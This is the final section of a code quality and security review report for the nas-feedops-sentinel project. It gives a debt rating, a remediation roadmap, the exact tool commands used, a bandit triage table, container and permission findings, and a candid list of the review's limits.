| **Total** | **373.8 h (46.7 person-days)** |

**Debt ratio 5.15%: rating B**, 0.15 points over the A boundary. This is the honest reading of the standard method. Two cautions: the 30 min/line constant is generous, and at 10 min/line the ratio is **15.5%, rating C**; and the estimate excludes anything the reviewers could not see. Treat the rating as a trend line, not an absolute.

**Roadmap**

| Sprint | Items | Hours |
|---|---|---|
| 1: this week | R-01, R-02, S-01, S-02, S-03, S-04, W-01, W-02, R-06, S-07, S-08, I-01, I-05 | 39.5 |
| 2: next | S-13, S-14, S-16, R-03, R-04, R-05, I-02, I-07, I-13, S-05, S-06 | 58.0 |
| Backlog | Complexity refactors (evaluation, swim_file_ingest, investigation), dashboard tests, I-03, I-04, I-06, Low items | 276.3 |

---

## Level 3: evidence and method

<details>
<summary><b>3.1 Tools, versions and exact commands</b></summary>

Tools ran in a throwaway container built from the project's own `test` image target, with the repository mounted read-only. Tool versions are whatever `pip install` resolved on 2026-09-30.

```bash
# radon (complexity, maintainability), bandit, vulture, ruff broad sweep, pip-audit
docker run --rm -v "$PWD/nas-feedops-sentinel:/repo:ro" -v "$OUT:/out" nas-feedops-sentinel:test sh /out/run_tools.sh
#   radon cc -s -a -j src dashboard scripts
#   bandit -r src dashboard scripts -f json
#   vulture src dashboard scripts --min-confidence 60
#   ruff check --isolated --no-cache --line-length 120 --target-version py312 \
#     --select E,F,W,I,C90,PLR,PLW,SIM,B,RET,ARG,PERF,RUF,PTH,ERA,T20,DTZ,TRY,BLE,S,A,N,UP,C4,PIE,RSE,SLF,FBT \
#     --ignore E501,PLR2004,S101,FBT001,FBT002,TRY003,N802,ARG001,ARG002 src dashboard scripts
#   pip-audit -r requirements.lock --no-deps --disable-pip
#   pip-audit -r requirements-dev.lock --no-deps --disable-pip

# repository's own lint and the full suite with branch coverage (throwaway postgres:16 on its own network)
ruff check src tests scripts dashboard
python -m pytest -q --cov=src --cov=dashboard --cov-branch --cov-report=json:/app/cov.json --durations=12
```

Custom scripts (standard library only, in the review scratch area, not committed): inventory and churn, AST smell scan, duplication window scan (six non-trivial lines), secrets scan over `git ls-files` and `git log --all -p`, test-layer classifier, SQALE model. They are small and can be re-created from the descriptions in this file.

</details>

<details>
<summary><b>3.2 Bandit triage (48 findings, 0 High)</b></summary>

| Rule | Count | Verdict | Reason |
|---|---|---|---|
| B608 hardcoded SQL | 11 | False positive | `audit_repo.py:59,65`, `briefs_repo.py:62,67`, `model_calls_repo.py:29,44,54`, `staged_actions_repo.py:171,258,272,279`. Each interpolates only a module-level column list; every value is a `$n` parameter |
| B104 bind all interfaces | 1 | Informational | `metrics.py:191` binds `0.0.0.0` inside the container. Port 9108 is not published to the host, and Prometheus scrapes it over the compose network. Bind to the container address if you want it strict |
| B311 `random` | 32 | Not applicable | `sample_data.py` (synthetic data) and one prune-probability draw in `ingest_log_repo.py:99` |
| B105 hardcoded password | 3 | False positive | Status strings `'ok'` and an emoji in `agent_eval.py:28-29` and `theme.py:108` |
| B405 xml.etree import | 1 | False positive | `swim_file_ingest.py:41` is used for type annotations only; parsing is `SafeET.parse(path, forbid_dtd=True)` at `:180` |

</details>

<details>
<summary><b>3.3 Container and infrastructure facts</b></summary>

- Dockerfile: multi-stage, runtime and final stages run as non-root `sentinel`, `HEALTHCHECK` present, base `python:3.12-slim` tag-pinned (not digest).
- Compose: all host ports bind `127.0.0.1`; public listeners are not published to the host and are reached only through the tunnel. `cloudflared` is digest-pinned, `read_only`, `cap_drop: [ALL]`, `no-new-privileges`. No other service sets those. No `mem_limit` or `pids_limit` anywhere.
- Image pinning: digest-pinned: pgbouncer, litellm, spiffe-helper, vault (app compose), prometheus, grafana, cloudflared. Tag-only: `nginx:1.27-alpine`, `keycloak:26.3`, `postgres:16` (four uses), `pgvector/pgvector:pg16`, `temporalio/*`, `spire-*:1.9.6`, `hashicorp/vault:1.15.2` (infra compose), `nas-feedops-sentinel:latest`.
- CI: `permissions: contents: read`, concurrency groups, no `pull_request_target`. Semgrep (`p/python`, `p/secrets`, `p/java` plus `.semgrep/sentinel.yml`) and Trivy are SHA-pinned; `actions/checkout@v4`, `setup-python@v5`, `setup-buildx-action@v3` and `build-push-action@v6` are tag-pinned (14 uses). Blocking gates: pytest with an 84% floor on `src/`, pip-audit on the runtime lock, Trivy, Semgrep.
- Host permissions: `icacls` on `nas-feedops-sentinel/tls` shows `CodexSandboxUsers:(I)(OI)(CI)(RX)` inherited from the repository parent. The infrastructure reviewer found the same inheritance on the unseal share, the bootstrap secret-id, the CA and Vault keys, both `.env` files, `secrets.toml` and `terraform.tfstate`. **This review did not change any permission.** The fix is `icacls <dir> /inheritance:r /grant:r "$env:USERNAME:(OI)(CI)F" "SYSTEM:(OI)(CI)F"` on those paths, which is your call.

</details>

<details>
<summary><b>3.4 Verification log: what was refuted, downgraded or merged</b></summary>

**Refuted or downgraded**

- My own AST heuristic flagged 14 "silent" broad `except` blocks. Sampling eight (`governance.py:111`, `model_telemetry.py:127`, `planner_agent.py:106`, `swim_file_ingest.py:1111,1215,1268,1438`, `logging_config.py:28`) showed each returns the failure reason, degrades deliberately or records it. Not a finding.
- Bandit B608, B405, B105, B311 and the 100% vulture hit: refuted (3.2).
- The dashboard reviewer found **no exploitable XSS** across all 60 `unsafe_allow_html` sites, and the application-security reviewer's independent scripted scan agreed.
- S-04 was hedged: it needs the API key and knowledge of a live message identity, so it is Medium, not High.
- S-01 was hedged: `secrets.toml` exists, so it is a latent misconfiguration, not a live exposure.

**Merged (several reviewers found the same defect)**

| Merged into | From |
|---|---|
| S-01 | dashboard reviewer DASH-E-2, security reviewer SEC-A-2 |
| S-02 | DASH-E-1, SEC-A-6, part of AI-C-7 |
| S-03 | DASH-E-3, SEC-A-7, part of AI-C-10 |
| S-04 | SEC-A-1, REL-B-4, the replay-provenance note |
| I-03 | INF-D-3 and the plaintext LiteLLM hop (SEC-A-11) |

**Verified by me** (re-read or executed): R-01, R-02, R-06, S-01, S-02, S-03, S-04, S-07, S-08, S-13 (executed), S-17, I-01 (ACL read), I-02, I-05, I-07, I-08, I-11, I-12, W-01, W-02, W-03 (code only, the spoof was not run), and every bandit item. **Reported with quoted evidence, not independently re-read** (marked P): the rest.

</details>

<details>
<summary><b>3.5 Limits of this review</b></summary>

- **Static plus a test run.** No dynamic testing (no scanner against the running dashboard, no fuzzing, no load test). Keycloak and Cloudflare behaviour were read from configuration, not probed.
- **Whole tree, not a diff.** The review recipe is defined for a diff; here it was applied to everything you asked about, so there is no "the PR introduced this" attribution.
- **Reviewer findings vary in depth.** Five reviewers each had their own area; a few files were only skimmed (the reliability reviewer notes the Temporal SDK is not installed locally, so its duplicate-start claim is from memory).
- **Model-based estimates.** Effort hours, the complexity-to-hours table and the 3 min per statement figure are stated estimates, not measurements. The 30 min/line development cost is SonarQube's convention.
- **Heuristics.** Test layers are classified by file content. The duplication detector is a token-window scan, not a full clone detector. The secrets scan is 12 regex rules with no entropy analysis. The "modules never referenced by a test" list from the classifier is superseded by coverage: no file is at 0%.
- **Grades are judgment**, made from the numbers above, not tool output.
- **Not covered:** the Java kit-output class beyond what the security reviewer read, Terraform beyond provider pinning and state ignore, legal or licence review, and the vendored `reference/` directory.
- **Secrets policy.** No `.env`, `secrets.toml`, key or token file was opened. Findings that name such files rely on existence, permissions and `git check-ignore` only.

</details>

---

*Generated by a review run on 2026-09-30 against `f249c13`. No code was changed.*
